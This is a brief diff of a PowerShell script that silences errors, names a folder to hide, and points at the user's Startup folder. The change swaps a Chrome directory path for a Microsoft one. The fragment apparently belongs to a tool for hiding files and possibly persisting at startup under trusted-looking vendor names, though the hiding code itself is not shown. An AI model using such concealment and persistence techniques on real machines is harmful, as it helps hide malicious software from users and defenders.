@@ -2,7 +2,7 @@
 $ErrorActionPreference = "SilentlyContinue"
 
 # Define paths to hide
-$folderPath = "C:\Program Files\Chrome"
+$folderPath = "C:\Program Files\Microsoft"
 $startupFolderPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
 
 # Function to hide a folder completely
